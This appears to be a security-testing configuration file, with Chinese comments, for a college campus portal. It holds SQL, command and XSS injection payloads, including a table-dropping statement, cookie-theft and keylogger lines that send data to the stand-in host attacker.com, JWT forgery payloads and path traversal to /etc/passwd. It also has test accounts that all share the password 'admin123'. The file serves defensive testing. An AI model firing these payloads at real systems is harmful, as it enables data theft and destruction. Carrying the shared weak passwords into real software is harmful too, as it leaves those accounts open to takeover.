# OWASP安全测试配置文件
# 哈尔滨信息工程学院校园门户系统安全测试配置

# SQL注入测试载荷
SQL_INJECTION_PAYLOADS = [
    # 经典布尔盲注
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    
    # 联合查询注入
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --",
    "' UNION SELECT null,null,null,null,null,null,null,null,null,null --",
    
    # 时间盲注
    "' AND SLEEP(5) --",
    "' WAITFOR DELAY '0:0:5' --",
    
    # 错误注入
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    
    # 堆叠注入
    "'; DROP TABLE notification_info; --",
    "'; INSERT INTO notification_info VALUES (999,'injected','test'); --",
    
    # 二阶注入
    "admin'/**/OR/**/'1'='1",
    
    # NoSQL注入 (MongoDB)
    "'; return 1==1; var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); return 1==2; //",
    
    # XML注入
    "'><script>alert('XSS')</script>",
    
    # LDAP注入
    "*)(&(objectClass=*)",
    
    # 命令注入
    "'; exec master..xp_cmdshell 'ping localhost' --",
    "; ls -la",
    "| whoami",
    "& echo vulnerable &"
]

# XSS测试载荷
XSS_PAYLOADS = [
    # 基本XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    
    # 绕过过滤器的XSS
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=\"javascript:alert('XSS')\">",
    "<img src=# onerror=alert('XSS')>",
    
    # 事件处理器XSS
    "<body onload=alert('XSS')>",
    "<input type='text' onkeydown='alert(\"XSS\")'>",
    "<div onmouseover='alert(\"XSS\")'>XSS</div>",
    
    # CSS XSS
    "<style>@import'javascript:alert(\"XSS\")';</style>",
    "<div style=\"background-image: url(javascript:alert('XSS'))\">",
    
    # DOM XSS
    "<script>document.write('<img src=x onerror=alert(\"DOM XSS\")/>')</script>",
    "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",  # base64 encoded alert('XSS')
    
    # 反射XSS
    "javascript:alert('Reflected XSS')",
    
    # 存储XSS
    "<script>localStorage.setItem('xss','<img src=x onerror=alert(\"Stored XSS\")/>')</script>",
    
    # JSON XSS
    "\"}]);alert('JSON XSS');//",
    
    # SVG XSS
    "<svg><script>alert('SVG XSS')</script></svg>",
    
    # WAF绕过
    "<script>alert`1`</script>",
    "<svg><script>alert&lpar;1&rpar;</script>",
    "<<SCRIPT>alert('XSS')</SCRIPT>",
    
    # Cookie窃取
    "<script>document.location='http://attacker.com/cookie='+document.cookie</script>",
    
    # 键盘记录
    "<script>document.onkeypress=function(e){fetch('http://attacker.com/log='+String.fromCharCode(e.which))}</script>"
]

# JWT安全测试配置
JWT_TEST_CONFIG = {
    "algorithms_to_test": ["none", "HS256", "RS256"],
    "weak_secrets": ["", "secret", "123456", "admin", "password"],
    "malicious_payloads": [
        {"alg": "none", "payload": {"username": "admin", "role": "SYSTEM_ADMIN"}},
        {"alg": "HS256", "payload": {"username": "admin", "role": "SYSTEM_ADMIN", "exp": 9999999999}},
    ],
    "token_manipulation": [
        "remove_signature",
        "change_algorithm", 
        "extend_expiration",
        "privilege_escalation"
    ]
}

# 权限测试矩阵
PERMISSION_TEST_MATRIX = {
    "roles": ["STUDENT", "TEACHER", "CLASS_TEACHER", "ACADEMIC_ADMIN", "PRINCIPAL", "SYSTEM_ADMIN"],
    "notification_levels": [1, 2, 3, 4],
    "scopes": ["CLASS", "GRADE", "DEPARTMENT", "SCHOOL_WIDE"],
    "unauthorized_actions": [
        {"role": "STUDENT", "action": "publish_level_1", "expected": "FORBIDDEN"},
        {"role": "STUDENT", "action": "school_wide_scope", "expected": "FORBIDDEN"},
        {"role": "TEACHER", "action": "publish_level_1", "expected": "FORBIDDEN"},
        {"role": "TEACHER", "action": "school_wide_scope", "expected": "FORBIDDEN"},
    ]
}

# CSRF测试配置
CSRF_TEST_CONFIG = {
    "malicious_origins": [
        "http://evil.com",
        "https://attacker.com", 
        "null",
        "http://localhost:8080"
    ],
    "test_endpoints": [
        "/admin-api/test/notification/api/publish-database",
        "/admin-api/test/todo-new/api/publish",
        "/admin-api/test/permission-cache/api/clear-cache"
    ],
    "required_headers": [
        "Origin",
        "Referer", 
        "X-Requested-With",
        "CSRF-Token"
    ]
}

# 安全头检查配置
SECURITY_HEADERS = {
    "required_headers": [
        "X-Frame-Options",
        "X-XSS-Protection", 
        "X-Content-Type-Options",
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "Referrer-Policy"
    ],
    "expected_values": {
        "X-Frame-Options": "DENY",
        "X-XSS-Protection": "1; mode=block",
        "X-Content-Type-Options": "nosniff",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains"
    }
}

# 输入验证测试数据
INPUT_VALIDATION_TESTS = {
    "boundary_tests": [
        "",  # 空输入
        "A" * 10000,  # 超长输入
        "中文测试内容",  # Unicode测试
        "\x00\x01\x02",  # 控制字符
        "../../etc/passwd",  # 路径遍历
        "javascript:alert(1)",  # 协议注入
    ],
    "special_characters": [
        "'\"\\<>&",
        "%3Cscript%3E",  # URL编码
        "&lt;script&gt;",  # HTML实体编码
        "\u003cscript\u003e",  # Unicode编码
    ]
}

# API安全测试端点
API_ENDPOINTS = {
    "authentication": [
        "/mock-school-api/auth/authenticate",
        "/mock-school-api/auth/user-info",
        "/mock-school-api/auth/verify"
    ],
    "notifications": [
        "/admin-api/test/notification/api/publish-database",
        "/admin-api/test/notification/api/list",
        "/admin-api/test/notification/api/approve",
        "/admin-api/test/notification/api/reject"
    ],
    "todos": [
        "/admin-api/test/todo-new/api/publish",
        "/admin-api/test/todo-new/api/my-list",
        "/admin-api/test/todo-new/api/{id}/complete"
    ],
    "permissions": [
        "/admin-api/test/permission-cache/api/test-class-permission",
        "/admin-api/test/permission-cache/api/test-school-permission",
        "/admin-api/test/permission-cache/api/clear-cache"
    ]
}

# 测试账号配置
TEST_ACCOUNTS = {
    "system_admin": {
        "employeeId": "SYSTEM_ADMIN_001",
        "name": "系统管理员",
        "password": "admin123",
        "expected_permissions": ["SYSTEM_MANAGEMENT", "ALL_LEVELS", "ALL_SCOPES"]
    },
    "principal": {
        "employeeId": "PRINCIPAL_001", 
        "name": "Principal-Zhang",
        "password": "admin123",
        "expected_permissions": ["LEVEL_1_4", "SCHOOL_WIDE"]
    },
    "teacher": {
        "employeeId": "TEACHER_001",
        "name": "Teacher-Wang", 
        "password": "admin123",
        "expected_permissions": ["LEVEL_3_4", "DEPARTMENT", "CLASS"]
    },
    "student": {
        "employeeId": "STUDENT_001",
        "name": "Student-Zhang",
        "password": "admin123", 
        "expected_permissions": ["LEVEL_4", "CLASS"]
    }
}

# 威胁建模配置
THREAT_MODEL = {
    "attack_vectors": [
        "SQL_INJECTION",
        "XSS", 
        "CSRF",
        "JWT_MANIPULATION",
        "PRIVILEGE_ESCALATION",
        "IDOR",
        "SSRF",
        "FILE_UPLOAD",
        "COMMAND_INJECTION"
    ],
    "attack_scenarios": [
        {
            "name": "恶意学生提升权限",
            "steps": ["获取学生Token", "尝试发布管理员通知", "绕过权限检查"],
            "expected_outcome": "被阻止"
        },
        {
            "name": "外部攻击者SQL注入",
            "steps": ["发现注入点", "提取数据库信息", "获取用户数据"],
            "expected_outcome": "被防护机制阻止"
        }
    ]
}

# 合规性检查
COMPLIANCE_REQUIREMENTS = {
    "OWASP_TOP_10": [
        "A01_Broken_Access_Control",
        "A02_Cryptographic_Failures", 
        "A03_Injection",
        "A04_Insecure_Design",
        "A05_Security_Misconfiguration",
        "A06_Vulnerable_Components",
        "A07_Identification_Authentication_Failures",
        "A08_Software_Data_Integrity_Failures",
        "A09_Security_Logging_Monitoring_Failures",
        "A10_Server_Side_Request_Forgery"
    ],
    "GDPR": ["数据保护", "隐私权限", "数据最小化"],
    "ISO_27001": ["信息安全管理", "风险评估", "访问控制"]
}

# 测试报告配置
REPORT_CONFIG = {
    "severity_levels": ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"],
    "color_scheme": {
        "CRITICAL": "🚨",
        "HIGH": "🔴", 
        "MEDIUM": "🟡",
        "LOW": "🟢",
        "INFO": "ℹ️",
        "GOOD": "✅"
    },
    "report_sections": [
        "Executive Summary",
        "Risk Assessment", 
        "Technical Findings",
        "Remediation Recommendations",
        "Compliance Status"
    ]
}